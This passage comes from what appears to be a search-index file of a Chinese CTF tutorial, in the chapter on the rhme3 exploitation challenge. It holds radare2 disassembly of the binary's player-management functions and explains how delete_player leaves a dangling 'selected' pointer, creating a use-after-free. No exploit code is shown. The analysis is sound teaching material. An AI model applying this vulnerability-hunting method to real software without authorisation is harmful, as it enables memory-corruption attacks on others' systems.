\n\u5947\u602a\u7684\u4e8b\u60c5\u53d1\u751f\u4e86\uff0c\u7a0b\u5e8f\u6ca1\u6709\u63d0\u9192\u6211\u4eec\u7403\u5458\u4e0d\u5b58\u5728\uff0c\u800c\u662f\u76f4\u63a5\u8bfb\u53d6\u4e86\u5185\u5b58\u4e2d\u7684\u4fe1\u606f\u3002  \u4e8e\u662f\u6211\u4eec\u731c\u6d4b\uff0c\u7a0b\u5e8f\u5728 free \u7403\u5458\u65f6\u6ca1\u6709\u5c06 select \u7684\u503c\u7f6e\u7a7a\uff0c\u5bfc\u81f4\u4e86 use-after-free \u7684\u95ee\u9898\u3002\u5173\u4e8e UAF \u5df2\u7ecf\u5728\u524d\u9762\u7684\u7ae0\u8282\u4e2d\u8bb2\u8fc7\u4e86\u3002  \u5f88\u660e\u663e\uff0c\u6bcf\u4e2a\u7403\u5458\u90fd\u662f\u4e00\u4e2a\u4e0b\u9762\u8fd9\u6837\u7684\u7ed3\u6784\u4f53\uff1a struct   player   { \n     int32_t   attack_pts ; \n     int32_t   defense_pts ; \n     int32_t   speed ; \n     int32_t   precision ; \n     char   * name ;  }", 
            "title": "\u9898\u76ee\u89e3\u6790"
        }, 
        {
            "location": "/pwn/lab/6.1.9_rhme3_exploitation/#_3", 
            "text": "\u5148\u6765\u770b\u4e00\u4e0b\u6dfb\u52a0\u7403\u5458\u7684\u8fc7\u7a0b\uff0c\u51fd\u6570  sym.add_player \uff1a [0x00400ec0]  pdf @ sym.add_player\n/ (fcn) sym.add_player 789\n|   sym.add_player ();\n|           ; var int local_11ch @ rbp-0x11c\n|           ; var int local_118h @ rbp-0x118\n|           ; var int local_110h @ rbp-0x110\n|           ; var int local_8h @ rbp-0x8\n|              ; CALL XREF from 0x00402235 (main + 148)\n|           0x00401801      55             push rbp\n|           0x00401802      4889e5         mov rbp, rsp\n|           0x00401805      4881ec200100.  sub rsp, 0x120\n|           0x0040180c      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ;  (  ; 40\n|           0x00401815      488945f8       mov qword [local_8h], rax\n|           0x00401819      31c0           xor eax, eax\n|           0x0040181b      48c785e8feff.  mov qword [local_118h], 0\n|           0x00401826      c785e4feffff.  mov dword [local_11ch], 0    ; player \u7f16\u53f7\u521d\u59cb\u503c\u4e3a 0\n|       ,=  0x00401830      eb07           jmp 0x401839\n|       |      ; JMP XREF from 0x00401853 (sym.add_player)\n|      .--  0x00401832      8385e4feffff.  add dword [local_11ch], 1    ; \u7f16\u53f7\u52a0 1\n|      :|      ; JMP XREF from 0x00401830 (sym.add_player)\n|      :`-  0x00401839      83bde4feffff.  cmp dword [local_11ch], 0xa ; [0xa:4]=-1 ; 10\n|      :,=  0x00401840      7713           ja 0x401855\n|      :|   0x00401842      8b85e4feffff   mov eax, dword [local_11ch]\n|      :|   0x00401848      488b04c58031.  mov rax, qword [rax*8 + obj.players] ; [0x603180:8]=0\n|      :|   0x00401850      4885c0         test rax, rax\n|      `==  0x00401853      75dd           jne 0x401832\n|       |      ; JMP XREF from 0x00401840 (sym.add_player)\n|       `-  0x00401855      83bde4feffff.  cmp dword [local_11ch], 0xb ; [0xb:4]=-1 ; 11\n|       ,=  0x0040185c      751e           jne 0x40187c\n|       |   0x0040185e      bf70244000     mov edi, str.Maximum_number_of_players_reached ; 0x402470 ;  Maximum number of players reached! \n|       |   0x00401863      e818f4ffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x00401868      488b05f11820.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|       |   0x0040186f      4889c7         mov rdi, rax\n|       |   0x00401872      e849f5ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|      ,==  0x00401877      e984020000     jmp 0x401b00\n|      ||      ; JMP XREF from 0x0040185c (sym.add_player)\n|      |`-  0x0040187c      8b85e4feffff   mov eax, dword [local_11ch]\n|      |    0x00401882      89c6           mov esi, eax\n|      |    0x00401884      bf93244000     mov edi, str.Found_free_slot:__d ; 0x402493 ;  Found free slot: %d\\n \n|      |    0x00401889      b800000000     mov eax, 0\n|      |    0x0040188e      e86df4ffff     call sym.imp.printf         ; int printf(const char *format)\n|      |    0x00401893      488b05c61820.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|      |    0x0040189a      4889c7         mov rdi, rax\n|      |    0x0040189d      e81ef5ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|      |    0x004018a2      bf18000000     mov edi, 0x18               ; 24\n|      |    0x004018a7      e804f5ffff     call sym.imp.malloc         ;  void *malloc(size_t size) ; \u7b2c\u4e00\u4e2a malloc\uff0c\u7ed9 player \u7ed3\u6784\u4f53\u5206\u914d\u7a7a\u95f4\n|      |    0x004018ac      488985e8feff.  mov qword [local_118h], rax  ; \u8fd4\u56de\u5730\u5740 rax -  [local_118h]\n|      |    0x004018b3      4883bde8feff.  cmp qword [local_118h], 0\n|      |,=  0x004018bb      751e           jne 0x4018db\n|      ||   0x004018bd      bfa8244000     mov edi, 0x4024a8\n|      ||   0x004018c2      e8b9f3ffff     call sym.imp.puts           ; int puts(const char *s)\n|      ||   0x004018c7      488b05921820.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|      ||   0x004018ce      4889c7         mov rdi, rax\n|      ||   0x004018d1      e8eaf4ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|     ,===  0x004018d6      e925020000     jmp 0x401b00\n|     |||      ; JMP XREF from 0x004018bb (sym.add_player)\n|     ||`-  0x004018db      488b85e8feff.  mov rax, qword [local_118h]\n|     ||    0x004018e2      ba18000000     mov edx, 0x18               ; 24\n|     ||    0x004018e7      be00000000     mov esi, 0\n|     ||    0x004018ec      4889c7         mov rdi, rax\n|     ||    0x004018ef      e82cf4ffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)\n|     ||    0x004018f4      bfbb244000     mov edi, str.Enter_player_name: ; 0x4024bb ;  Enter player name:  \n|     ||    0x004018f9      b800000000     mov eax, 0\n|     ||    0x004018fe      e8fdf3ffff     call sym.imp.printf         ; int printf(const char *format)\n|     ||    0x00401903      488b05561820.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|     ||    0x0040190a      4889c7         mov rdi, rax\n|     ||    0x0040190d      e8aef4ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|     ||    0x00401912      488d85f0feff.  lea rax, rbp - 0x110\n|     ||    0x00401919      ba00010000     mov edx, 0x100              ; 256\n|     ||    0x0040191e      be00000000     mov esi, 0\n|     ||    0x00401923      4889c7         mov rdi, rax\n|     ||    0x00401926      e8f5f3ffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)\n|     ||    0x0040192b      488d85f0feff.  lea rax, rbp - 0x110\n|     ||    0x00401932      be00010000     mov esi, 0x100              ; 256\n|     ||    0x00401937      4889c7         mov rdi, rax\n|     ||    0x0040193a      e884fbffff     call sym.readline\n|     ||    0x0040193f      488d85f0feff.  lea rax, rbp - 0x110         ; \u8bfb\u5165\u5b57\u7b26\u4e32\u5230 rbp - 0x110\n|     ||    0x00401946      4889c7         mov rdi, rax\n|     ||    0x00401949      e852f3ffff     call sym.imp.strlen         ; size_t strlen(const char *s) ; player.name \u957f\u5ea6\n|     ||    0x0040194e      4883c001       add rax, 1                   ; \u957f\u5ea6\u52a0 1\n|     ||    0x00401952      4889c7         mov rdi, rax\n|     ||    0x00401955      e856f4ffff     call sym.imp.malloc         ;  void *malloc(size_t size) ; \u7b2c\u4e8c\u4e2a malloc\uff0c\u7ed9 player.name \u5206\u914d\u7a7a\u95f4\n|     ||    0x0040195a      4889c2         mov rdx, rax                 ; \u8fd4\u56de\u5730\u5740 rax -  rdx\n|     ||    0x0040195d      488b85e8feff.  mov rax, qword [local_118h]  ; player \u7ed3\u6784\u4f53 [local_118h] -  rax\n|     ||    0x00401964      48895010       mov qword [rax + 0x10], rdx  ; player.name \u5b58\u653e\u5230 [rax + 0x10]\n|     ||    0x00401968      488b85e8feff.  mov rax, qword [local_118h]\n|     ||    0x0040196f      488b4010       mov rax, qword [rax + 0x10] ;\n|     ||    0x00401973      4885c0         test rax, rax\n|     ||,=  0x00401976      7523           jne 0x40199b\n|     |||   0x00401978      bfcf244000     mov edi, str.Could_not_allocate ; 0x4024cf ;  Could not allocate! \n|     |||   0x0040197d      b800000000     mov eax, 0\n|     |||   0x00401982      e879f3ffff     call sym.imp.printf         ; int printf(const char *format)\n|     |||   0x00401987      488b05d21720.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|     |||   0x0040198e      4889c7         mov rdi, rax\n|     |||   0x00401991      e82af4ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|    ,====  0x00401996      e965010000     jmp 0x401b00\n|    ||||      ; JMP XREF from 0x00401976 (sym.add_player)\n|    |||`-  0x0040199b      488b85e8feff.  mov rax, qword [local_118h]\n|    |||    0x004019a2      488b4010       mov rax, qword [rax + 0x10] ; [0x10:8]=-1 ; 16 ; \u53d6\u51fa player.name \u5230 rax\n|    |||    0x004019a6      488d95f0feff.  lea rdx, rbp - 0x110         ; \u53d6\u51fa payler.name \u5b57\u7b26\u4e32\u5730\u5740\u5230 rdx\n|    |||    0x004019ad      4889d6         mov rsi, rdx                 ; rdx -  rsi\n|    |||    0x004019b0      4889c7         mov rdi, rax                 ; rax -  rdi\n|    |||    0x004019b3      e8b8f2ffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src) ; \u5c06\u5b57\u7b26\u4e32\u590d\u5236\u5230 player.name \u6307\u5411\u7684\u5730\u5740\n|    |||    0x004019b8      bfe3244000     mov edi, str.Enter_attack_points: ; 0x4024e3 ;  Enter attack points:  \n|    |||    0x004019bd      b800000000     mov eax, 0\n|    |||    0x004019c2      e839f3ffff     call sym.imp.printf         ; int printf(const char *format)\n|    |||    0x004019c7      488b05921720.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|    |||    0x004019ce      4889c7         mov rdi, rax\n|    |||    0x004019d1      e8eaf3ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|    |||    0x004019d6      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x004019dd      be04000000     mov esi, 4\n|    |||    0x004019e2      4889c7         mov rdi, rax\n|    |||    0x004019e5      e8d9faffff     call sym.readline            ; \u8bfb\u5165 attack_pts\n|    |||    0x004019ea      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x004019f1      4889c7         mov rdi, rax\n|    |||    0x004019f4      e847f4ffff     call sym.imp.atoi           ; int atoi(const char *str)\n|    |||    0x004019f9      89c2           mov edx, eax\n|    |||    0x004019fb      488b85e8feff.  mov rax, qword [local_118h]\n|    |||    0x00401a02      8910           mov dword [rax], edx         ; \u5c06 attack_pts \u5199\u5165 local_118h\n|    |||    0x00401a04      bff9244000     mov edi, str.Enter_defense_points: ; 0x4024f9 ;  Enter defense points:  \n|    |||    0x00401a09      b800000000     mov eax, 0\n|    |||    0x00401a0e      e8edf2ffff     call sym.imp.printf         ; int printf(const char *format)\n|    |||    0x00401a13      488b05461720.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|    |||    0x00401a1a      4889c7         mov rdi, rax\n|    |||    0x00401a1d      e89ef3ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|    |||    0x00401a22      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x00401a29      be04000000     mov esi, 4\n|    |||    0x00401a2e      4889c7         mov rdi, rax\n|    |||    0x00401a31      e88dfaffff     call sym.readline            ; \u8bfb\u5165 defense_pts\n|    |||    0x00401a36      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x00401a3d      4889c7         mov rdi, rax\n|    |||    0x00401a40      e8fbf3ffff     call sym.imp.atoi           ; int atoi(const char *str)\n|    |||    0x00401a45      89c2           mov edx, eax\n|    |||    0x00401a47      488b85e8feff.  mov rax, qword [local_118h]\n|    |||    0x00401a4e      895004         mov dword [rax + 4], edx     ; \u5c06 defense_pts \u5199\u5165 local_118h + 4\n|    |||    0x00401a51      bf10254000     mov edi, str.Enter_speed:   ; 0x402510 ;  Enter speed:  \n|    |||    0x00401a56      b800000000     mov eax, 0\n|    |||    0x00401a5b      e8a0f2ffff     call sym.imp.printf         ; int printf(const char *format)\n|    |||    0x00401a60      488b05f91620.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|    |||    0x00401a67      4889c7         mov rdi, rax\n|    |||    0x00401a6a      e851f3ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|    |||    0x00401a6f      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x00401a76      be04000000     mov esi, 4\n|    |||    0x00401a7b      4889c7         mov rdi, rax\n|    |||    0x00401a7e      e840faffff     call sym.readline            ; \u8bfb\u5165 speed\n|    |||    0x00401a83      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x00401a8a      4889c7         mov rdi, rax\n|    |||    0x00401a8d      e8aef3ffff     call sym.imp.atoi           ; int atoi(const char *str)\n|    |||    0x00401a92      89c2           mov edx, eax\n|    |||    0x00401a94      488b85e8feff.  mov rax, qword [local_118h]\n|    |||    0x00401a9b      895008         mov dword [rax + 8], edx     ; \u5c06 speed \u5199\u5165 local_118 + 8\n|    |||    0x00401a9e      bf1e254000     mov edi, str.Enter_precision: ; 0x40251e ;  Enter precision:  \n|    |||    0x00401aa3      b800000000     mov eax, 0\n|    |||    0x00401aa8      e853f2ffff     call sym.imp.printf         ; int printf(const char *format)\n|    |||    0x00401aad      488b05ac1620.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|    |||    0x00401ab4      4889c7         mov rdi, rax\n|    |||    0x00401ab7      e804f3ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|    |||    0x00401abc      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x00401ac3      be04000000     mov esi, 4\n|    |||    0x00401ac8      4889c7         mov rdi, rax\n|    |||    0x00401acb      e8f3f9ffff     call sym.readline            ; \u8bfb\u5165 precision\n|    |||    0x00401ad0      488d85f0feff.  lea rax, rbp - 0x110\n|    |||    0x00401ad7      4889c7         mov rdi, rax\n|    |||    0x00401ada      e861f3ffff     call sym.imp.atoi           ; int atoi(const char *str)\n|    |||    0x00401adf      89c2           mov edx, eax\n|    |||    0x00401ae1      488b85e8feff.  mov rax, qword [local_118h]\n|    |||    0x00401ae8      89500c         mov dword [rax + 0xc], edx   ; \u5c06 precision \u5199\u5165 local_118h + 0xc\n|    |||    0x00401aeb      8b85e4feffff   mov eax, dword [local_11ch]  ; player \u7f16\u53f7\n|    |||    0x00401af1      488b95e8feff.  mov rdx, qword [local_118h]  ; player \u7ed3\u6784\u4f53\n|    |||    0x00401af8      488914c58031.  mov qword [rax*8 + obj.players], rdx ; [0x603180:8]=0 ; \u5f53\u524d player \u7ed3\u6784\u4f53\u5730\u5740\u5199\u5165 rax*8 + obj.players\n|    |||       ; JMP XREF from 0x00401996 (sym.add_player)\n|    |||       ; JMP XREF from 0x004018d6 (sym.add_player)\n|    |||       ; JMP XREF from 0x00401877 (sym.add_player)\n|    ```--  0x00401b00      488b45f8       mov rax, qword [local_8h]\n|           0x00401b04      644833042528.  xor rax, qword fs:[0x28]\n|       ,=  0x00401b0d      7405           je 0x401b14\n|       |   0x00401b0f      e8acf1ffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x00401b0d (sym.add_player)\n|       `-  0x00401b14      c9             leave\n\\           0x00401b15      c3             ret \n\u8be5\u51fd\u6570\u4f1a\u505a\u4e00\u4e9b\u57fa\u672c\u7684\u68c0\u67e5\uff0c\u5982\u7403\u5458\u6700\u5927\u6570\u91cf\u7b49\uff0c\u7136\u540e\u5f00\u59cb\u6dfb\u52a0\u7403\u5458\u7684\u8fc7\u7a0b\u3002\u6839\u636e\u6211\u4eec\u7684\u5206\u6790\uff0c obj.players  \u5e94\u8be5\u662f\u4e00\u4e2a\u5168\u5c40\u6570\u7ec4\uff0c\u7528\u4e8e\u5b58\u653e\u6240\u6709\u7403\u5458\u7684\u5730\u5740\u3002 [0x00400ec0]  is~players\nvaddr=0x00603180 paddr=0x00003180 ord=090 fwd=NONE sz=88 bind=GLOBAL type=OBJECT name=players \n\u5f53\u7403\u5458\u6dfb\u52a0\u5b8c\u6210\u540e\uff0c\u5c31\u5c06\u5176\u7ed3\u6784\u4f53\u5730\u5740\u6dfb\u52a0\u5230\u8fd9\u4e2a\u6570\u7ec4\u4e2d\u3002\u7403\u5458\u7684\u9009\u62e9\u8fc7\u7a0b\u5c31\u662f\u901a\u8fc7\u8fd9\u4e2a\u6570\u7ec4\u5b8c\u6210\u7684\u3002  \u4e0b\u9762\u662f\u9009\u62e9\u7403\u5458\u7684\u8fc7\u7a0b\uff0c\u51fd\u6570  sym.select_player \uff1a [0x00400ec0]  pdf @ sym.select_player\n/ (fcn) sym.select_player 214\n|   sym.select_player ();\n|           ; var int local_14h @ rbp-0x14\n|           ; var int local_10h @ rbp-0x10\n|           ; var int local_8h @ rbp-0x8\n|              ; CALL XREF from 0x0040224d (main + 172)\n|           0x00401c05      55             push rbp\n|           0x00401c06      4889e5         mov rbp, rsp\n|           0x00401c09      4883ec20       sub rsp, 0x20\n|           0x00401c0d      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ;  (  ; 40\n|           0x00401c16      488945f8       mov qword [local_8h], rax\n|           0x00401c1a      31c0           xor eax, eax\n|           0x00401c1c      bf30254000     mov edi, str.Enter_index:   ; 0x402530 ;  Enter index:  \n|           0x00401c21      b800000000     mov eax, 0\n|           0x00401c26      e8d5f0ffff     call sym.imp.printf         ; int printf(const char *format)\n|           0x00401c2b      488b052e1520.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|           0x00401c32      4889c7         mov rdi, rax\n|           0x00401c35      e886f1ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|           0x00401c3a      488d45f0       lea rax, rbp - 0x10\n|           0x00401c3e      be04000000     mov esi, 4\n|           0x00401c43      4889c7         mov rdi, rax\n|           0x00401c46      e878f8ffff     call sym.readline            ; \u8bfb\u5165\u7403\u5458\u7f16\u53f7\n|           0x00401c4b      488d45f0       lea rax, rbp - 0x10\n|           0x00401c4f      4889c7         mov rdi, rax\n|           0x00401c52      e8e9f1ffff     call sym.imp.atoi           ; int atoi(const char *str)\n|           0x00401c57      8945ec         mov dword [local_14h], eax   ; \u7f16\u53f7 eax -  [local_14h]\n|           0x00401c5a      837dec0a       cmp dword [local_14h], 0xa  ; [0xa:4]=-1 ; 10\n|       ,=  0x00401c5e      7710           ja 0x401c70\n|       |   0x00401c60      8b45ec         mov eax, dword [local_14h]\n|       |   0x00401c63      488b04c58031.  mov rax, qword [rax*8 + obj.players] ; [0x603180:8]=0\n|       |   0x00401c6b      4885c0         test rax, rax\n|      ,==  0x00401c6e      751b           jne 0x401c8b\n|      ||      ; JMP XREF from 0x00401c5e (sym.select_player)\n|      |`-  0x00401c70      bf3e254000     mov edi, str.Invalid_index  ; 0x40253e ;  Invalid index \n|      |    0x00401c75      e806f0ffff     call sym.imp.puts           ; int puts(const char *s)\n|      |    0x00401c7a      488b05df1420.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|      |    0x00401c81      4889c7         mov rdi, rax\n|      |    0x00401c84      e837f1ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|      |,=  0x00401c89      eb3a           jmp 0x401cc5\n|      ||      ; JMP XREF from 0x00401c6e (sym.select_player)\n|      `--  0x00401c8b      8b45ec         mov eax, dword [local_14h]   ; \u53d6\u51fa\u7f16\u53f7 [local_14h] -  eax\n|       |   0x00401c8e      488b04c58031.  mov rax, qword [rax*8 + obj.players] ; [0x603180:8]=0 ; \u627e\u5230\u7f16\u53f7\u5bf9\u5e94\u7684\u7403\u5458\u5730\u5740\n|       |   0x00401c96      488905d31420.  mov qword [obj.selected], rax ; [0x603170:8]=0 ; \u5c06\u5730\u5740\u5199\u5165 [obj.selected]\n|       |   0x00401c9d      bf58254000     mov edi, str.Player_selected ; 0x402558 ;  Player selected! \n|       |   0x00401ca2      e8d9efffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x00401ca7      488b05b21420.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|       |   0x00401cae      4889c7         mov rdi, rax\n|       |   0x00401cb1      e80af1ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|       |   0x00401cb6      488b05b31420.  mov rax, qword [obj.selected] ; [0x603170:8]=0 ; \u53d6\u51fa\u7403\u5458\u5730\u5740\n|       |   0x00401cbd      4889c7         mov rdi, rax                 ; rax -  rdi\n|       |   0x00401cc0      e8c6faffff     call sym.show_player_func    ; \u8c03\u7528\u51fd\u6570 sym.show_player_func \u6253\u5370\u51fa\u7403\u5458\u4fe1\u606f\n|       |      ; JMP XREF from 0x00401c89 (sym.select_player)\n|       `-  0x00401cc5      488b45f8       mov rax, qword [local_8h]\n|           0x00401cc9      644833042528.  xor rax, qword fs:[0x28]\n|       ,=  0x00401cd2      7405           je 0x401cd9\n|       |   0x00401cd4      e8e7efffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x00401cd2 (sym.select_player)\n|       `-  0x00401cd9      c9             leave\n\\           0x00401cda      c3             ret \n\u5bf9\u8c61  obj.selected  \u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u7528\u4e8e\u5b58\u653e\u9009\u62e9\u7684\u7403\u5458\u7f16\u53f7\u3002 [0x00400ec0]  is~selected\nvaddr=0x00603170 paddr=0x00003170 ord=095 fwd=NONE sz=8 bind=GLOBAL type=OBJECT name=selected \n\u9009\u4e2d\u7403\u5458\u4e4b\u540e\uff0c\u6253\u5370\u7403\u5458\u4fe1\u606f\u7684\u64cd\u4f5c\u5c31\u662f\u901a\u8fc7\u4ece  obj.selected  \u4e2d\u83b7\u53d6\u7403\u5458\u5730\u5740\u5b9e\u73b0\u7684\u3002  \u4e0b\u9762\u662f\u5220\u9664\u7403\u5458\u7684\u8fc7\u7a0b\uff0c\u51fd\u6570  sym.delete_player \uff1a [0x00400ec0]  pdf @ sym.delete_player\n/ (fcn) sym.delete_player 239\n|   sym.delete_player ();\n|           ; var int local_1ch @ rbp-0x1c\n|           ; var int local_18h @ rbp-0x18\n|           ; var int local_10h @ rbp-0x10\n|           ; var int local_8h @ rbp-0x8\n|              ; CALL XREF from 0x00402241 (main + 160)\n|           0x00401b16      55             push rbp\n|           0x00401b17      4889e5         mov rbp, rsp\n|           0x00401b1a      4883ec20       sub rsp, 0x20\n|           0x00401b1e      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ;  (  ; 40\n|           0x00401b27      488945f8       mov qword [local_8h], rax\n|           0x00401b2b      31c0           xor eax, eax\n|           0x00401b2d      bf30254000     mov edi, str.Enter_index:   ; 0x402530 ;  Enter index:  \n|           0x00401b32      b800000000     mov eax, 0\n|           0x00401b37      e8c4f1ffff     call sym.imp.printf         ; int printf(const char *format)\n|           0x00401b3c      488b051d1620.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|           0x00401b43      4889c7         mov rdi, rax\n|           0x00401b46      e875f2ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|           0x00401b4b      488d45f0       lea rax, rbp - 0x10\n|           0x00401b4f      be04000000     mov esi, 4\n|           0x00401b54      4889c7         mov rdi, rax\n|           0x00401b57      e867f9ffff     call sym.readline            ; \u8bfb\u5165\u7403\u5458\u7f16\u53f7\n|           0x00401b5c      488d45f0       lea rax, rbp - 0x10\n|           0x00401b60      4889c7         mov rdi, rax\n|           0x00401b63      e8d8f2ffff     call sym.imp.atoi           ; int atoi(const char *str)\n|           0x00401b68      8945e4         mov dword [local_1ch], eax   ; \u7f16\u53f7 eax -  [local_1ch]\n|           0x00401b6b      837de40a       cmp dword [local_1ch], 0xa  ; [0xa:4]=-1 ; 10\n|       ,=  0x00401b6f      7710           ja 0x401b81\n|       |   0x00401b71      8b45e4         mov eax, dword [local_1ch]\n|       |   0x00401b74      488b04c58031.  mov rax, qword [rax*8 + obj.players] ; [0x603180:8]=0\n|       |   0x00401b7c      4885c0         test rax, rax\n|      ,==  0x00401b7f      751b           jne 0x401b9c\n|      ||      ; JMP XREF from 0x00401b6f (sym.delete_player)\n|      |`-  0x00401b81      bf3e254000     mov edi, str.Invalid_index  ; 0x40253e ;  Invalid index \n|      |    0x00401b86      e8f5f0ffff     call sym.imp.puts           ; int puts(const char *s)\n|      |    0x00401b8b      488b05ce1520.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|      |    0x00401b92      4889c7         mov rdi, rax\n|      |    0x00401b95      e826f2ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|      |,=  0x00401b9a      eb53           jmp 0x401bef\n|      ||      ; JMP XREF from 0x00401b7f (sym.delete_player)\n|      `--  0x00401b9c      8b45e4         mov eax, dword [local_1ch]   ; \u53d6\u51fa\u7f16\u53f7 [local_1ch] -  eax\n|       |   0x00401b9f      488b04c58031.  mov rax, qword [rax*8 + obj.players] ; [0x603180:8]=0 ; \u627e\u5230\u7f16\u53f7\u5bf9\u5e94\u7684\u7403\u5458\u5730\u5740\n|       |   0x00401ba7      488945e8       mov qword [local_18h], rax   ; \u5c06\u7403\u5458\u5730\u5740 rax \u653e\u5165 [local_18h]\n|       |   0x00401bab      8b45e4         mov eax, dword [local_1ch]   ; \u53d6\u51fa\u7f16\u53f7 [local_1ch] -  eax\n|       |   0x00401bae      48c704c58031.  mov qword [rax*8 + obj.players], 0 ; [0x603180:8]=0 ; \u5c06 players \u6570\u7ec4\u4e2d\u7684\u5bf9\u5e94\u503c\u7f6e\u96f6\n|       |   0x00401bba      488b45e8       mov rax, qword [local_18h]   ; \u5c06\u7403\u5458\u5730\u5740 [local_18h] \u653e\u56de rax\n|       |   0x00401bbe      488b4010       mov rax, qword [rax + 0x10] ; [0x10:8]=-1 ; 16 ; \u53d6\u51fa player.name \u6307\u5411\u7684\u5b57\u7b26\u4e32\n|       |   0x00401bc2      4889c7         mov rdi, rax                 ; \u5b57\u7b26\u4e32\u5730\u5740 rax -  rdi\n|       |   0x00401bc5      e886f0ffff     call sym.imp.free           ; void free(void *ptr)   ; \u8c03\u7528\u51fd\u6570 free \u91ca\u653e\u7403\u5458\u540d\u5b57\n|       |   0x00401bca      488b45e8       mov rax, qword [local_18h]   ; \u5c06\u7403\u5458\u5730\u5740 [local_18h] \u653e\u56de rax\n|       |   0x00401bce      4889c7         mov rdi, rax                 ; \u7403\u5458\u5730\u5740 rax -  rdi\n|       |   0x00401bd1      e87af0ffff     call sym.imp.free           ; void free(void *ptr)   ; \u8c03\u7528\u51fd\u6570 free \u91ca\u653e\u7403\u5458\u7ed3\u6784\u4f53\n|       |   0x00401bd6      bf4c254000     mov edi, str.She_s_gone     ; 0x40254c ;  She s gone! \n|       |   0x00401bdb      e8a0f0ffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x00401be0      488b05791520.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|       |   0x00401be7      4889c7         mov rdi, rax\n|       |   0x00401bea      e8d1f1ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|       |      ; JMP XREF from 0x00401b9a (sym.delete_player)\n|       `-  0x00401bef      488b45f8       mov rax, qword [local_8h]\n|           0x00401bf3      644833042528.  xor rax, qword fs:[0x28]\n|       ,=  0x00401bfc      7405           je 0x401c03\n|       |   0x00401bfe      e8bdf0ffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x00401bfc (sym.delete_player)\n|       `-  0x00401c03      c9             leave\n\\           0x00401c04      c3             ret \n\u8be5\u51fd\u6570\u9996\u5148\u91ca\u653e\u6389\u7403\u5458\u7684\u540d\u5b57\uff0c\u7136\u540e\u91ca\u653e\u6389\u7403\u5458\u7684\u7ed3\u6784\u4f53\u3002\u5374\u6ca1\u6709\u5bf9  obj.selected  \u505a\u4efb\u4f55\u4fee\u6539\uff0c\u800c\u8be5\u5bf9\u8c61\u4e2d\u5b58\u653e\u7684\u662f\u9009\u4e2d\u7403\u5458\u7684\u5730\u5740\uff0c\u8fd9\u5c31\u5b58\u5728\u4e00\u4e2a\u903b\u8f91\u6f0f\u6d1e\uff0c\u5982\u679c\u6211\u4eec\u5728\u91ca\u653e\u7403\u5458\u4e4b\u524d\u9009\u4e2d\u8be5\u7403\u5458\uff0c\u5219\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528\u8fd9\u4e2a\u6307\u9488\u5bf9\u5185\u5b58\u8fdb\u884c\u64cd\u4f5c\uff0c\u5373 UAF \u6f0f\u6d1e\u3002  \u6700\u540e\u770b\u4e00\u4e0b\u663e\u793a\u7403\u5458\u4fe1\u606f\u7684\u8fc7\u7a0b\uff0c\u51fd\u6570  sym.show_player \uff1a [0x00400ec0]  pdf @ sym.show_player\n/ (fcn) sym.show_player 99\n|   sym.show_player ();\n|           ; var int local_8h @ rbp-0x8\n|              ; CALL XREF from 0x00402265 (main + 196)\n|           0x004020b4      55             push rbp\n|           0x004020b5      4889e5         mov rbp, rsp\n|           0x004020b8      4883ec10       sub rsp, 0x10\n|           0x004020bc      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ;  (  ; 40\n|           0x004020c5      488945f8       mov qword [local_8h], rax\n|           0x004020c9      31c0           xor eax, eax\n|           0x004020cb      488b059e1020.  mov rax, qword [obj.selected] ; [0x603170:8]=0\n|           0x004020d2      4885c0         test rax, rax\n|       ,=  0x004020d5      751b           jne 0x4020f2\n|       |   0x004020d7      bfe8254000     mov edi, str.No_player_selected_index ; 0x4025e8 ;  No player selected index 